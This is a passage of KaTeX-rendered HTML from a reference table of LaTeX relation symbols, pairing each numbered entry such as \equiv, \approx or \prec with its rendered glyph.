amsrm">≱</span></span></span></span></td><td style="text-align:left">\ngeq</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span></span></span></span></td><td style="text-align:left">\equiv</td><td style="text-align:center">52</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≱</mo></mrow><annotation encoding="application/x-tex">\ngeqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.33902em;vertical-align:-0.41951em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\ngeqq</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≢</mo></mrow><annotation encoding="application/x-tex">\not\equiv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span></span></span></span></td><td style="text-align:left">\not\equiv</td><td style="text-align:center">53</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≩</mo></mrow><annotation encoding="application/x-tex">\gneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm">≩</span></span></span></span></td><td style="text-align:left">\gneqq</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≐</mo></mrow><annotation encoding="application/x-tex">\doteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.67em;vertical-align:0em;"></span><span class="mrel">≐</span></span></span></span></td><td style="text-align:left">\doteq</td><td style="text-align:center">54</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≩</mo></mrow><annotation encoding="application/x-tex">\gvertneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\gvertneqq</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≑</mo></mrow><annotation encoding="application/x-tex">\doteqdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6639600000000001em;vertical-align:-0.08198em;"></span><span class="mrel amsrm">≑</span></span></span></span></td><td style="text-align:left">\doteqdot</td><td style="text-align:center">55</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≶</mo></mrow><annotation encoding="application/x-tex">\lessgtr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8558em;vertical-align:-0.1808em;"></span><span class="mrel amsrm">≶</span></span></span></span></td><td style="text-align:left">\lessgtr</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo><mover><mo><mo>=</mo></mo><mi><munder><mo></mo><mrow><mi mathvariant="normal">d</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">f</mi></mrow></munder></mi></mover></mo></mrow><annotation encoding="application/x-tex">\overset{\underset{\mathrm{def}}{}}{=}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.14139em;vertical-align:0em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.14139em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">=</span></span></span><span style="top:-4.04139em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mop op-limits mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-2.7755575615628914e-17em;"><span style="top:-1.8379714285714286em;margin-left:0em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">d</span><span class="mord mathrm mtight">e</span><span class="mord mathrm mtight" style="margin-right:0.07778em;">f</span></span></span></span></span><span style="top:-2.5em;"><span class="pstrut" style="height:2.5em;"></span><span><span class="mop mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8050285714285714em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overset{\underset{\mathrm{def}}{}}{=}</td><td style="text-align:center">56</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋚</mo></mrow><annotation encoding="application/x-tex">\lesseqgtr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.27138em;vertical-align:-0.38569em;"></span><span class="mrel amsrm">⋚</span></span></span></span></td><td style="text-align:left">\lesseqgtr</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>:</mo><mo>=</mo></mrow><annotation encoding="application/x-tex">:=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span></span></span></td><td style="text-align:left">:=</td><td style="text-align:center">57</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪋</mo></mrow><annotation encoding="application/x-tex">\lesseqqgtr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.46512em;vertical-align:-0.48256em;"></span><span class="mrel amsrm">⪋</span></span></span></span></td><td style="text-align:left">\lesseqqgtr</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∼</mo></mrow><annotation encoding="application/x-tex">\sim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">∼</span></span></span></span></td><td style="text-align:left">\sim</td><td style="text-align:center">58</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≷</mo></mrow><annotation encoding="application/x-tex">\gtrless</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8558em;vertical-align:-0.1808em;"></span><span class="mrel amsrm">≷</span></span></span></span></td><td style="text-align:left">\gtrless</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≁</mo></mrow><annotation encoding="application/x-tex">\nsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">≁</span></span></span></span></td><td style="text-align:left">\nsim</td><td style="text-align:center">59</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋛</mo></mrow><annotation encoding="application/x-tex">\gtreqless</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.27138em;vertical-align:-0.38569em;"></span><span class="mrel amsrm">⋛</span></span></span></span></td><td style="text-align:left">\gtreqless</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∽</mo></mrow><annotation encoding="application/x-tex">\backsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.37788em;vertical-align:0em;"></span><span class="mrel amsrm">∽</span></span></span></span></td><td style="text-align:left">\backsim</td><td style="text-align:center">60</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪌</mo></mrow><annotation encoding="application/x-tex">\gtreqqless</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.46512em;vertical-align:-0.48256em;"></span><span class="mrel amsrm">⪌</span></span></span></span></td><td style="text-align:left">\gtreqqless</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∼</mo></mrow><annotation encoding="application/x-tex">\thicksim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel amsrm">∼</span></span></span></span></td><td style="text-align:left">\thicksim</td><td style="text-align:center">61</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩽</mo></mrow><annotation encoding="application/x-tex">\leqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⩽</span></span></span></span></td><td style="text-align:left">\leqslant</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≃</mo></mrow><annotation encoding="application/x-tex">\simeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≃</span></span></span></span></td><td style="text-align:left">\simeq</td><td style="text-align:center">62</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≰</mo></mrow><annotation encoding="application/x-tex">\nleqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\nleqslant</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋍</mo></mrow><annotation encoding="application/x-tex">\backsimeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46402em;vertical-align:0em;"></span><span class="mrel amsrm">⋍</span></span></span></span></td><td style="text-align:left">\backsimeq</td><td style="text-align:center">63</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪕</mo></mrow><annotation encoding="application/x-tex">\eqslantless</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⪕</span></span></span></span></td><td style="text-align:left">\eqslantless</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≂</mo></mrow><annotation encoding="application/x-tex">\eqsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel amsrm">≂</span></span></span></span></td><td style="text-align:left">\eqsim</td><td style="text-align:center">64</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⩾</mo></mrow><annotation encoding="application/x-tex">\geqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⩾</span></span></span></span></td><td style="text-align:left">\geqslant</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≅</mo></mrow><annotation encoding="application/x-tex">\cong</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.589em;vertical-align:0em;"></span><span class="mrel">≅</span></span></span></span></td><td style="text-align:left">\cong</td><td style="text-align:center">65</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≱</mo></mrow><annotation encoding="application/x-tex">\ngeqslant</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm"></span></span></span></span></td><td style="text-align:left">\ngeqslant</td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≆</mo></mrow><annotation encoding="application/x-tex">\ncong</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">≆</span></span></span></span></td><td style="text-align:left">\ncong</td><td style="text-align:center">66</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪖</mo></mrow><annotation encoding="application/x-tex">\eqslantgtr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7733399999999999em;vertical-align:-0.13667em;"></span><span class="mrel amsrm">⪖</span></span></span></span></td><td style="text-align:left">\eqslantgtr</td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\approx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.48312em;vertical-align:0em;"></span><span class="mrel">≈</span></span></span></span></td><td style="text-align:left">\approx</td><td style="text-align:center">67</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≲</mo></mrow><annotation encoding="application/x-tex">\lesssim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.95916em;vertical-align:-0.22958em;"></span><span class="mrel amsrm">≲</span></span></span></span></td><td style="text-align:left">\lesssim</td></tr><tr><td style="text-align:center">20</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≈</mo></mrow><annotation encoding="application/x-tex">\thickapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.48312em;vertical-align:0em;"></span><span class="mrel amsrm">≈</span></span></span></span></td><td style="text-align:left">\thickapprox</td><td style="text-align:center">68</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋦</mo></mrow><annotation encoding="application/x-tex">\lnsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.97333em;vertical-align:-0.23222em;"></span><span class="mrel amsrm">⋦</span></span></span></span></td><td style="text-align:left">\lnsim</td></tr><tr><td style="text-align:center">21</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≊</mo></mrow><annotation encoding="application/x-tex">\approxeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66334em;vertical-align:-0.08167em;"></span><span class="mrel amsrm">≊</span></span></span></span></td><td style="text-align:left">\approxeq</td><td style="text-align:center">69</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪅</mo></mrow><annotation encoding="application/x-tex">\lessapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">⪅</span></span></span></span></td><td style="text-align:left">\lessapprox</td></tr><tr><td style="text-align:center">22</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≍</mo></mrow><annotation encoding="application/x-tex">\asymp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≍</span></span></span></span></td><td style="text-align:left">\asymp</td><td style="text-align:center">70</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪉</mo></mrow><annotation encoding="application/x-tex">\lnapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0189300000000001em;vertical-align:-0.26167em;"></span><span class="mrel amsrm">⪉</span></span></span></span></td><td style="text-align:left">\lnapprox</td></tr><tr><td style="text-align:center">23</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∝</mo></mrow><annotation encoding="application/x-tex">\propto</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">∝</span></span></span></span></td><td style="text-align:left">\propto</td><td style="text-align:center">71</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≳</mo></mrow><annotation encoding="application/x-tex">\gtrsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.95916em;vertical-align:-0.22958em;"></span><span class="mrel amsrm">≳</span></span></span></span></td><td style="text-align:left">\gtrsim</td></tr><tr><td style="text-align:center">24</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∝</mo></mrow><annotation encoding="application/x-tex">\varpropto</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69224em;vertical-align:0em;"></span><span class="mrel amsrm">∝</span></span></span></span></td><td style="text-align:left">\varpropto</td><td style="text-align:center">72</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋧</mo></mrow><annotation encoding="application/x-tex">\gnsim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.97333em;vertical-align:-0.23222em;"></span><span class="mrel amsrm">⋧</span></span></span></span></td><td style="text-align:left">\gnsim</td></tr><tr><td style="text-align:center">25</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo></mrow><annotation encoding="application/x-tex">&lt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span></span></span></td><td style="text-align:left">&lt;</td><td style="text-align:center">73</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪆</mo></mrow><annotation encoding="application/x-tex">\gtrapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.01166em;vertical-align:-0.25583em;"></span><span class="mrel amsrm">⪆</span></span></span></span></td><td style="text-align:left">\gtrapprox</td></tr><tr><td style="text-align:center">26</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≮</mo></mrow><annotation encoding="application/x-tex">\nless</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9115200000000001em;vertical-align:-0.20576em;"></span><span class="mrel amsrm">≮</span></span></span></span></td><td style="text-align:left">\nless</td><td style="text-align:center">74</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪊</mo></mrow><annotation encoding="application/x-tex">\gnapprox</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0189300000000001em;vertical-align:-0.26167em;"></span><span class="mrel amsrm">⪊</span></span></span></span></td><td style="text-align:left">\gnapprox</td></tr><tr><td style="text-align:center">27</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≪</mo></mrow><annotation encoding="application/x-tex">\ll</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≪</span></span></span></span></td><td style="text-align:left">\ll</td><td style="text-align:center">75</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≺</mo></mrow><annotation encoding="application/x-tex">\prec</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≺</span></span></span></span></td><td style="text-align:left">\prec</td></tr><tr><td style="text-align:center">28</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≪̸</mo></mrow><annotation encoding="application/x-tex">\not\ll</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≪</span></span></span></span></td><td style="text-align:left">\not\ll</td><td style="text-align:center">76</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊀</mo></mrow><annotation encoding="application/x-tex">\nprec</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9115200000000001em;vertical-align:-0.20576em;"></span><span class="mrel amsrm">⊀</span></span></span></span></td><td style="text-align:left">\nprec</td></tr><tr><td style="text-align:center">29</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋘</mo></mrow><annotation encoding="application/x-tex">\lll</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⋘</span></span></span></span></td><td style="text-align:left">\lll</td><td style="text-align:center">77</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪯</mo></mrow><annotation encoding="application/x-tex">\preceq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⪯</span></span></span></span></td><td style="text-align:left">\preceq</td></tr><tr><td style="text-align:center">30</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋘̸</mo></mrow><annotation encoding="application/x-tex">\not\lll</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.58503em;vertical-align:-0.03517em;"></span><span class="mrel amsrm">⋘</span></span></span></span></td><td style="text-align:left">\not\lll</td><td style="text-align:center">78</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋠</mo></mrow><annotation encoding="application/x-tex">\npreceq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.09657em;vertical-align:-0.30274em;"></span><span class="mrel amsrm">⋠</span></span></span></span></td><td style="text-align:left">\npreceq</td></tr><tr><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⋖</mo></mrow><annotation encoding="application/x-tex">\lessdot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord amsrm">⋖</span></span></span></span></td><td style="text-align:left">\lessdot</td><td style="text-align:center">79</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪵</mo></mrow><annotation encoding="application/x-tex">\precneqq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00868em;vertical-align:-0.25142em;"></span><span class="mrel amsrm">⪵</span></span></span></span></td><td style="text-align:left">\precneqq</td></tr><tr><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span></span></span></span></td><td style="text-align:left">&gt;</td><td style="text-align:center">80</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≻</mo></mrow><annotation encoding="application/x-tex">\succ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≻</span></span></span></span></td><td style="text-align:left">\succ</td></tr><tr><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≯</mo></mrow><annotation encoding="application/x-tex">\ngtr</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9115200000000001em;vertical-align:-0.20576em;"></span><span class="mrel amsrm">≯</span></span></span></span></td><td style="text-align:left">\ngtr</td><td style="text-align:center">81</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊁</mo></mrow><annotation encoding="application/x-tex">\nsucc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9115200000000001em;vertical-align:-0.20576em;"></span><span class="mrel amsrm">⊁</span></span></span></span></td><td style="text-align:left">\nsucc</td></tr><tr><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≫</mo></mrow><annotation encoding="application/x-tex">\gg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">≫</span></span></span></span></td><td style="text-align:left">\gg</td><td style="text-align:center">82</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⪰</mo></mrow><annotation encoding="application/x-tex">\succeq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⪰</span></span></span></span></td><td style="text-align:left">\succeq</td></tr><tr><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≫̸</mo></mrow><annotation encoding="application/x-tex">\not\gg</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span 